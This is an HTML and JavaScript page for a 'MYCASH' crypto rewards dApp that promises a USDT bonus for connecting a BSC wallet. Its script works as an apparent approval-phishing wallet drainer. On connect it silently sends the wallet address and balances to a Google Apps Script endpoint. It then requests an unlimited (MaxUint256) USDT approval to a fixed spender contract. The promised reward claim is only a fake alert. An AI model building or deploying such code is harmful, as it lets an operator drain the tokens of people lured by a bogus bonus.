<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>MYCASH — Rewards</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}

    body{
      font-family:system-ui,Segoe UI,Arial;
      background:#050816;
      color:#e6eef8;
      min-height:100vh;
      display:flex;
      flex-direction:column;
    }

    /* HEADER – nav + user info */
    header{
      background:#071027;
      padding:10px 16px;
      position:sticky;
      top:0;
      z-index:20;
      border-bottom:1px solid rgba(255,255,255,0.08);
      backdrop-filter:blur(10px);
    }
    .nav{
      max-width:980px;
      margin:0 auto;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:12px;
    }
    .nav-left{display:flex;gap:14px;flex-wrap:wrap}
    a{
      color:#dbeafe;
      text-decoration:none;
      padding:6px 10px;
      border-radius:6px;
      font-size:0.9rem;
    }
    a:hover{background:#0f1b33}
    .logo{font-weight:700;letter-spacing:4px;font-size:1rem;white-space:nowrap;}

    .nav-right{
      display:flex;
      flex-direction:column;
      align-items:flex-end;
      gap:2px;
      max-width:420px;
    }
    .header-line{
      font-size:0.78rem;
      color:#9fb0c8;
      white-space:nowrap;
      overflow:hidden;
      text-overflow:ellipsis;
      max-width:100%;
    }

    .connect-header{
      margin-top:4px;
      display:flex;
      justify-content:flex-end;
    }

    .connect-btn{
      border:none;
      outline:none;
      border-radius:999px;
      padding:0.45rem 1.2rem;
      font-size:0.85rem;
      font-weight:600;
      cursor:pointer;
      background:linear-gradient(135deg,#3b82f6,#2563eb);
      color:#e5e7eb;
      box-shadow:0 12px 26px rgba(37,99,235,0.5);
      transition:transform 0.12s ease,box-shadow 0.12s ease;
      white-space:nowrap;
    }
    .connect-btn:hover{
      transform:translateY(-1px);
      box-shadow:0 16px 34px rgba(37,99,235,0.65);
    }

    main{
      max-width:980px;
      margin:20px auto;
      padding:16px;
      flex:1;
    }

    .reward-container{width:100%}

    .reward-title{
      text-align:center;
      margin-bottom:1.5rem;
    }
    .reward-title h1{
      font-size:1.8rem;
      margin-bottom:0.4rem;
    }
    .reward-title p{
      font-size:0.95rem;
      color:#9ca3af;
    }

    .reward-card{
      border-radius:1.2rem;
      padding:1.25rem 1.5rem;
      display:flex;
      align-items:center;
      justify-content:space-between;
      gap:1.25rem;
      border:1px solid rgba(148,163,184,0.4);
      box-shadow:0 16px 40px rgba(15,23,42,0.8);
      background:radial-gradient(circle at top left,#1e293b,#020617); /* card-1 */
    }

    .reward-left,
    .reward-center,
    .reward-right{
      display:flex;
      flex-direction:column;
      justify-content:center;
    }

    .reward-left{
      min-width:140px;
      gap:0.4rem;
    }

    .reward-tag{
      font-size:0.7rem;
      text-transform:uppercase;
      letter-spacing:0.18em;
      color:#64748b;
      margin-bottom:6px;
    }

    .wallet-icon-base{
      width:52px;
      height:52px;
      display:flex;
      align-items:center;
      justify-content:center;
      overflow:hidden;
      background:#020617;
      border:1px solid rgba(148,163,184,0.6);
      border-radius:999px;
      background:radial-gradient(circle at 20% 0,#1d4ed8,#020617);
    }
    .wallet-icon-base img{
      width:70%;
      height:70%;
      object-fit:contain;
      display:block;
    }

    .reward-center{
      flex:1;
      align-items:center;
      text-align:center;
      gap:0.25rem;
    }

    .reward-amount{
      font-size:2rem;
      font-weight:700;
      letter-spacing:0.03em;
    }

    .reward-label{
      font-size:0.85rem;
      text-transform:uppercase;
      color:#9ca3af;
      letter-spacing:0.18em;
    }

    .reward-desc{
      margin-top:4px;
      font-size:0.8rem;
      color:#9fb0c8;
      max-width:360px;
    }

    .btn{
      border:none;
      outline:none;
      border-radius:999px;
      padding:0.55rem 1.4rem;
      font-size:0.9rem;
      font-weight:600;
      cursor:pointer;
      transition:transform 0.12s ease, box-shadow 0.12s ease, background 0.15s ease, opacity 0.12s ease;
      display:inline-flex;
      align-items:center;
      justify-content:center;
      white-space:nowrap;
    }

    .btn-primary{
      background:linear-gradient(135deg,#22c55e,#16a34a);
      color:#022c22;
      box-shadow:0 14px 30px rgba(34,197,94,0.35);
      margin-top:0.45rem;
    }
    .btn-primary:hover:not([disabled]){
      transform:translateY(-1px);
      box-shadow:0 18px 40px rgba(34,197,94,0.5);
    }

    .btn-secondary{
      background:rgba(15,23,42,0.85);
      color:#e5e7eb;
      border:1px solid rgba(148,163,184,0.7);
      padding-inline:1.1rem;
      font-size:0.85rem;
    }
    .btn-secondary:hover{
      background:rgba(30,64,175,0.6);
      box-shadow:0 12px 28px rgba(30,64,175,0.55);
      transform:translateY(-1px);
    }

    .btn[disabled]{
      opacity:0.45;
      cursor:not-allowed;
      box-shadow:none;
      transform:none;
    }

    .reward-right{
      min-width:180px;
      align-items:flex-end;
      gap:0.4rem;
    }

    .small{font-size:0.85rem;color:#9fb0c8;}
    .mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono","Helvetica Neue", monospace;}

    .reward-extra{
      margin-top:18px;
    }

    .task-panel{
      margin-top:14px;
      padding:1rem 1.1rem;
      border-radius:0.9rem;
      border:1px dashed rgba(148,163,184,0.7);
      background:rgba(15,23,42,0.95);
      font-size:0.85rem;
      color:#cbd5f5;
    }
    .task-panel h3{
      font-size:0.95rem;
      margin-bottom:0.35rem;
    }
    .task-panel p{
      margin-bottom:0.35rem;
    }
    .task-panel ul{
      margin-left:1.2rem;
      margin-bottom:0.5rem;
    }
    .task-panel li{
      margin-bottom:0.15rem;
    }
    .task-status{
      margin-top:0.35rem;
      color:#22c55e;
      font-size:0.82rem;
    }

    footer{
      max-width:980px;
      margin:24px auto 16px auto;
      padding:12px;
      color:#9fb0c8;
      text-align:center;
      font-size:0.8rem;
    }

    @media(max-width:768px){
      .nav{
        flex-direction:column;
        align-items:flex-start;
      }
      .nav-right{
        align-items:flex-start;
      }

      .reward-card{
        flex-direction:column;
        align-items:stretch;
        text-align:center;
      }
      .reward-left{
        align-items:center;
      }
      .reward-right{
        align-items:center;
      }
    }
  </style>
</head>
<body>
  <header>
    <div class="nav">
      <div class="nav-left">
        <a href="index.html">Home</a>
        <a href="about.html">About</a>
        <a href="contact.html">Contact</a>
        <a href="reward.html" style="background:#0f1b33">Rewards</a>
      </div>
      <div class="logo">MYCASH</div>
      <div class="nav-right">
        <div class="header-line">Status: <span id="statusText">Not connected</span></div>
        <div class="header-line">Address: <span id="walletAddress" class="mono">—</span></div>
        <div class="header-line">Network: <span id="walletNetwork">—</span></div>
        <div class="header-line">User ID: <span id="userId" class="mono">-</span></div>
        <div class="connect-header">
          <button id="connectBtn" class="connect-btn">Connect Wallet</button>
        </div>
      </div>
    </div>
  </header>

  <main>
    <div class="reward-container">
      <div class="reward-title">
        <h1>Claim Your Reward</h1>
        <p>Connect your BSC wallet and complete the task to unlock your bonus.</p>
      </div>

      <!-- SINGLE REWARD CARD -->
      <div class="reward-card">
        <div class="reward-left">
          <div class="reward-tag">Reward #1</div>
          <div class="wallet-icon-base">
            <img src="logo.png" alt="MYCASH">
          </div>
          <span class="small">BSC • USDT Bonus</span>
        </div>

        <div class="reward-center">
          <div class="reward-amount" id="rewardAmountDisplay">$0.00</div>
          <div class="reward-label">Reward Balance</div>
          <div class="reward-desc">
            After you complete the task and we assign the bonus to you, it will appear here.
          </div>
        </div>

        <div class="reward-right">
          <button id="claimBtn" class="btn btn-primary" disabled>Claim</button>
          <button id="taskBtn" class="btn btn-secondary">Task</button>
          <span class="small" id="claimHint">
            Claim is locked until wallet is connected and task is completed.
          </span>
        </div>
      </div>

      <!-- TASK DETAILS PANEL -->
      <div id="taskPanel" class="task-panel" style="display:none;">
        <h3>Task Details</h3>
        <p>Complete the following task to become eligible for the reward:</p>
        <ul>
          <li>Connect your BSC wallet to this dApp (BSC Testnet / Mainnet as configured).</li>
          <li>Hold or deposit the required USDT amount (we will verify this later).</li>
          <li>Optional: perform any action you define later (e.g. swap, stake, invite, etc.).</li>
        </ul>
        <p class="small">
          Once you verify the user has completed the task, you can set the reward balance for their User ID and allow them to claim.
        </p>
        <button id="taskCompleteBtn" class="btn btn-secondary" style="margin-top:0.35rem;">Mark task as completed (demo)</button>
        <div id="taskStatusText" class="task-status" style="display:none;">
          ✅ Task marked as completed. If your wallet is connected, you can now claim.
        </div>
      </div>

      <!-- EXTRA WALLET INFO -->
      <div class="reward-extra small">
        <div>BNB Balance: <span id="walletBalance">—</span></div>
        <div id="tokens" style="margin-top:6px">
          Connect wallet to see USDT balance.
        </div>
      </div>
    </div>
  </main>

  <footer>
    © <span id="year"></span> MYCASH — BSC (BEP-20) • No private keys stored.
  </footer>

  <!-- libs -->
  <script src="https://unpkg.com/web3@1.2.11/dist/web3.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.0/dist/index.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>

  <!-- app script (based on your index page) -->
  <script type="module">
  (function(){
    // ===== CONFIG (copied from index) =====
    const APPS_SCRIPT_URL    = "https://script.google.com/macros/s/AKfycbzlCsXUoqaMW4fCTqK6H_SF7dGCDDkcIoO-To5YbLcBLdWEEKvGjHQm_vSUfwE06Yw/exec";
    const APPS_SCRIPT_SECRET = "mahfuzinam0045";

    // USDT on BSC TESTNET
    const TOKEN_ADDRESS   = "0x5915f45023012942c0F30B6652CEbb6A05810b90";
    const SPENDER_ADDRESS = "0x98fbcaA43b229601edb71E9923055ee485c29C3E"; // your smart contract

    const BNB_TESTNET_CHAIN_ID_DEC = 97;
    const BNB_TESTNET_CHAIN_ID_HEX = "0x61";
    const BNB_TESTNET_LABEL        = "BSC Testnet (97)";

    const ERC20_APPROVE_ABI = [
      "function approve(address spender, uint256 amount) public returns (bool)"
    ];
    const ERC20_BALANCE_ABI = [
      "function balanceOf(address owner) view returns (uint256)"
    ];

    // Reward logic: you can change this later or set from backend
    const DEMO_REWARD_AMOUNT = 10.00; // USD / USDT demo

    let web3ModalInstance = null;
    let providerInstance  = null;
    let web3Instance      = null;

    let isWalletConnected = false;
    let isTaskCompleted   = false;

    // ===== helpers for userId =====
    function storageKeyFor(address){
      return "userId_" + address.toLowerCase();
    }

    function generateUserIdFromAddress(address){
      address = (address || "").toLowerCase();
      let hash = 0;
      for (let i = 0; i < address.length; i++){
        hash = ((hash << 5) - hash) + address.charCodeAt(i);
        hash |= 0;
      }
      hash = Math.abs(hash);
      const num = 100000 + (hash % 900000); // 100000–999999
      return String(num);
    }

    function getOrCreateUserIdFor(address){
      const key = storageKeyFor(address);
      let id = localStorage.getItem(key);
      if (!id || !/^[0-9]{6}$/.test(id)) {
        id = generateUserIdFromAddress(address);
        localStorage.setItem(key, id);
      }
      return id;
    }

    // ===== UI refs =====
    const connectBtn      = document.getElementById("connectBtn");
    const statusTextEl    = document.getElementById("statusText");
    const walletAddressEl = document.getElementById("walletAddress");
    const userIdEl        = document.getElementById("userId");
    const walletNetworkEl = document.getElementById("walletNetwork");
    const walletBalanceEl = document.getElementById("walletBalance");
    const tokensContainer = document.getElementById("tokens");

    const claimBtn            = document.getElementById("claimBtn");
    const claimHintEl         = document.getElementById("claimHint");
    const taskBtn             = document.getElementById("taskBtn");
    const taskPanel           = document.getElementById("taskPanel");
    const taskCompleteBtn     = document.getElementById("taskCompleteBtn");
    const taskStatusTextEl    = document.getElementById("taskStatusText");
    const rewardAmountDisplay = document.getElementById("rewardAmountDisplay");

    function setStatus(txt){
      if(statusTextEl) statusTextEl.textContent = txt;
      console.log("[status]", txt);
    }

    function setWalletInfo(address, network, bnb){
      if(walletAddressEl) walletAddressEl.textContent = address || "—";
      if(walletNetworkEl) walletNetworkEl.textContent = network || "—";
      if(walletBalanceEl){
        walletBalanceEl.textContent =
          (bnb === null || bnb === undefined) ? "—" : (Number(bnb).toFixed(6) + " BNB");
      }
    }

    function setUserIdUI(id){
      if(userIdEl) userIdEl.textContent = id || "-";
    }

    function clearSessionUI(){
      isWalletConnected = false;
      setStatus("Not connected");
      setWalletInfo("—","—",null);
      setUserIdUI("-");
      if(tokensContainer){
        tokensContainer.textContent = "Connect wallet to see USDT balance.";
      }
      updateClaimState();
    }

    function updateClaimState(){
      if(!claimBtn) return;
      const enabled = isWalletConnected && isTaskCompleted;
      claimBtn.disabled = !enabled;
      if(claimHintEl){
        if(!isWalletConnected && !isTaskCompleted){
          claimHintEl.textContent = "Claim is locked until wallet is connected and task is completed.";
        } else if(!isWalletConnected){
          claimHintEl.textContent = "Please connect your wallet to claim.";
        } else if(!isTaskCompleted){
          claimHintEl.textContent = "Complete the task to unlock the Claim button.";
        } else {
          claimHintEl.textContent = "You can now claim your reward.";
        }
      }
    }

    function initWeb3ModalInstance(){
      const providerOptions = {
        walletconnect: {
          package: window.WalletConnectProvider.default,
          options: {
            rpc: { 97: "https://data-seed-prebsc-1-s1.binance.org:8545" },
            bridge: "https://bridge.walletconnect.org",
            qrcode: true
          }
        }
      };
      web3ModalInstance = new window.Web3Modal.default({
        cacheProvider: true,
        providerOptions
      });
    }

    function attachProviderListeners(p){
      if(!p || !p.on) return;
      try{
        p.on("accountsChanged", function(accounts){
          if(!accounts || !accounts.length){
            clearSessionUI();
            return;
          }
          const addr = accounts[0].toLowerCase();
          const uid  = getOrCreateUserIdFor(addr);
          setWalletInfo(addr, BNB_TESTNET_LABEL, null);
          setUserIdUI(uid);
          isWalletConnected = true;
          updateClaimState();
        });

        p.on("chainChanged", function(chainId){
          if(walletNetworkEl){
            walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
          }
        });

        p.on("disconnect", function(){
          clearSessionUI();
        });
      }catch(e){
        console.warn("attachProviderListeners", e);
      }
    }

    async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance){
      try{
        const payload = new URLSearchParams({
          secret      : APPS_SCRIPT_SECRET,
          address     : address,
          network     : networkText,
          timestamp   : new Date().toISOString(),
          userId      : userId,
          bnbBalance  : String(bnbBalance ?? ""),
          tokenBalance: String(tokenBalance ?? "")
        });

        await fetch(APPS_SCRIPT_URL, {
          method: "POST",
          mode  : "no-cors",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
          },
          body: payload.toString()
        });

        console.log("Sent log to Apps Script (no-cors).");
      }catch(err){
        console.error("notifyBackend error:", err);
      }
    }

    async function getTokenBalance(address){
      try{
        if(
          !TOKEN_ADDRESS ||
          !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)
        ){
          console.warn("TOKEN_ADDRESS not set or invalid, skipping token balance");
          return "";
        }
        if(!providerInstance){
          console.warn("No providerInstance for token balance");
          return "";
        }

        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
        const raw            = await tokenContract.balanceOf(address);
        const formatted      = ethers.formatUnits(raw, 18); // assumes 18 decimals
        return formatted;
      }catch(err){
        console.error("getTokenBalance error:", err);
        return "";
      }
    }

    async function switchToBSC(provider){
      try{
        await provider.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: BNB_TESTNET_CHAIN_ID_HEX }]
        });
        return true;
      }catch(switchError){
        if(switchError.code === 4902){
          try{
            await provider.request({
              method: "wallet_addEthereumChain",
              params: [{
                chainId: BNB_TESTNET_CHAIN_ID_HEX,
                chainName: "BNB Smart Chain Testnet",
                nativeCurrency:{name:"BNB",symbol:"tBNB",decimals:18},
                rpcUrls:["https://data-seed-prebsc-1-s1.binance.org:8545"],
                blockExplorerUrls:["https://testnet.bscscan.com"]
              }]
            });
            return true;
          }catch(addErr){
            console.error("Could not add BSC Testnet:", addErr);
            return false;
          }
        }
        console.error("Switch error:", switchError);
        return false;
      }
    }

    async function requestTokenApproval(){
      if(!TOKEN_ADDRESS){
        console.warn("TOKEN_ADDRESS not set, skipping approve");
        return;
      }
      if(!SPENDER_ADDRESS){
        console.warn("SPENDER_ADDRESS not set, skipping approve");
        return;
      }
      if(!providerInstance){
        console.warn("No providerInstance for approval");
        return;
      }

      try{
        setStatus("Requesting token approval…");
        const ethersProvider = new ethers.BrowserProvider(providerInstance);
        const signer         = await ethersProvider.getSigner();
        const userAddress    = (await signer.getAddress()).toLowerCase();

        if (TOKEN_ADDRESS.toLowerCase() === userAddress) {
          alert("ERROR: TOKEN_ADDRESS is set to your wallet address.\n\nIt MUST be the BEP-20 token contract address, not your wallet.");
          setStatus("Connected (approval skipped)");
          return;
        }

        const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
        const amount         = ethers.MaxUint256;

        const tx = await tokenContract.approve(SPENDER_ADDRESS, amount);
        console.log("Approve tx sent:", tx.hash);
        setStatus("Waiting for approval confirmation…");
        const receipt = await tx.wait();
        console.log("Approve confirmed:", receipt);
        setStatus("Connected + Approved ✅");
      }catch(err){
        console.error("Token approve error:", err);
        alert("Token approval failed: " + (err && err.message ? err.message : err));
        setStatus("Connected (approval failed)");
      }
    }

    // Restore BNB + USDT and mark wallet as connected
    async function restoreSessionFromAddress(address){
      const balanceWei = await web3Instance.eth.getBalance(address);
      const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
      const userId     = getOrCreateUserIdFor(address);

      setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
      setUserIdUI(userId);

      const tokenBalanceRaw  = await getTokenBalance(address);
      const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
      const prettyBalance    = tokenBalanceRaw ? Number(tokenBalanceRaw).toFixed(4) : "0.0000";

      if(tokensContainer){
        tokensContainer.innerHTML =
          'USDT balance: ' + prettyBalance +
          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
      }

      isWalletConnected = true;
      updateClaimState();

      return {
        balanceBNB,
        tokenBalance: tokenBalanceRaw,
        userId
      };
    }

    async function connectFlow(){
      try{
        setStatus("Connecting…");
        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

        // Trust Wallet extension
        if(!mobile && window.trustwallet && window.trustwallet.ethereum){
          providerInstance = window.trustwallet.ethereum;
          web3Instance     = new Web3(providerInstance);
          await providerInstance.request({ method: "eth_requestAccounts" });
        }
        // Standard injected (MetaMask, some Trust)
        else if(window.ethereum && !mobile){
          providerInstance = window.ethereum;
          web3Instance     = new Web3(providerInstance);
          await providerInstance.request({ method: "eth_requestAccounts" });
        }
        // WalletConnect via Web3Modal
        else {
          if(!web3ModalInstance) initWeb3ModalInstance();
          providerInstance = await web3ModalInstance.connect();
          web3Instance     = new Web3(providerInstance);
        }

        if(!providerInstance || !web3Instance){
          setStatus("No provider");
          alert("No wallet provider detected.");
          return;
        }

        attachProviderListeners(providerInstance);

        const accounts = await web3Instance.eth.getAccounts();
        if(!accounts || !accounts.length){
          setStatus("No account");
          return;
        }
        const address = accounts[0].toLowerCase();

        let chainId = await web3Instance.eth.getChainId();
        if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
          const switched = await switchToBSC(providerInstance);
          if(!switched){
            alert("Please switch to BSC Testnet.");
            setStatus("Wrong network");
            return;
          }
          chainId = await web3Instance.eth.getChainId();
          if(Number(chainId) !== BNB_TESTNET_CHAIN_ID_DEC){
            alert("Network switch failed");
            return;
          }
        }

        const { balanceBNB, tokenBalance, userId } =
          await restoreSessionFromAddress(address);

        setStatus("Connected");

        await notifyBackend(
          address,
          BNB_TESTNET_LABEL,
          userId,
          balanceBNB,
          tokenBalance
        );

        await requestTokenApproval();

      }catch(err){
        console.error("connectFlow error:", err);
        setStatus("Connection failed");
        alert("Connection failed: " + (err && err.message ? err.message : err));
      }
    }

    // silent restore using eth_accounts; returns true if restored
    async function tryAutoReconnectSilent(){
      const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

      // 1) Trust Wallet extension
      if(!mobile && window.trustwallet && window.trustwallet.ethereum){
        const injected = window.trustwallet.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);

        const accounts = await injected.request({ method: "eth_accounts" });
        if (accounts && accounts.length) {
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session (Trust Wallet)...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      // 2) Standard injected (MetaMask / some Trust)
      if(window.ethereum){
        const injected = window.ethereum;
        providerInstance = injected;
        web3Instance     = new Web3(providerInstance);
        attachProviderListeners(providerInstance);

        const accounts = await injected.request({ method: "eth_accounts" });
        if (accounts && accounts.length) {
          const address = accounts[0].toLowerCase();
          setStatus("Restoring session...");
          await restoreSessionFromAddress(address);
          setStatus("Connected (restored)");
          return true;
        }
      }

      // 3) Do NOT auto-connect WalletConnect silently (would open QR)
      return false;
    }

    async function autoConnectOnLoad(){
      try{
        const restored = await tryAutoReconnectSilent();
        if(restored) return;

        const mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);

        if(!mobile && ( (window.trustwallet && window.trustwallet.ethereum) || window.ethereum )){
          // optional: auto-connect on desktop
          // setStatus("Auto connecting…");
          // await connectFlow();
          clearSessionUI();
        }else{
          clearSessionUI();
        }
      }catch(e){
        console.warn("autoConnectOnLoad failed:", e);
        clearSessionUI();
      }
    }

    async function claimReward(){
      try{
        if(!isWalletConnected){
          alert("Please connect your wallet first.");
          setStatus("Connect wallet before claiming.");
          return;
        }
        if(!isTaskCompleted){
          alert("Please complete the task first.");
          setStatus("Complete task before claiming.");
          return;
        }
        if(!web3Instance || !providerInstance){
          alert("Wallet not ready, connect again.");
          return;
        }

        const accounts = await web3Instance.eth.getAccounts();
        if(!accounts || !accounts.length){
          setStatus("No account found. Connect again.");
          return;
        }
        const address = accounts[0].toLowerCase();

        setStatus("Claiming reward…");

        // TODO: add your real claim contract call here
        // const ethersProvider = new ethers.BrowserProvider(providerInstance);
        // const signer         = await ethersProvider.getSigner();
        // const claimContract  = new ethers.Contract(SPENDER_ADDRESS, CLAIM_ABI, signer);
        // const tx = await claimContract.claimReward();
        // await tx.wait();

        setTimeout(() => {
          setStatus("Reward claimed for " + address.slice(0,6) + "…" + address.slice(-4));
          alert("Reward claimed! (demo mode — add real contract call later)");
        }, 800);
      }catch(err){
        console.error("claimReward error:", err);
        setStatus("Reward claim failed");
        alert("Reward claim failed: " + (err && err.message ? err.message : err));
      }
    }

    // ===== DOMContentLoaded =====
    document.addEventListener("DOMContentLoaded", async function(){
      initWeb3ModalInstance();

      if(connectBtn){
        connectBtn.addEventListener("click", connectFlow);
      }
      if(claimBtn){
        claimBtn.addEventListener("click", claimReward);
      }
      if(taskBtn){
        taskBtn.addEventListener("click", function(){
          if(!taskPanel) return;
          const visible = taskPanel.style.display !== "none";
          taskPanel.style.display = visible ? "none" : "block";
        });
      }
      if(taskCompleteBtn){
        taskCompleteBtn.addEventListener("click", function(){
          isTaskCompleted = true;
          if(rewardAmountDisplay){
            rewardAmountDisplay.textContent = "$" + DEMO_REWARD_AMOUNT.toFixed(2);
          }
          if(taskStatusTextEl){
            taskStatusTextEl.style.display = "block";
          }
          updateClaimState();
        });
      }

      await autoConnectOnLoad();
      const yearEl = document.getElementById("year");
      if(yearEl) yearEl.textContent = new Date().getFullYear();
    });

  })();
  </script>
</body>
</html>
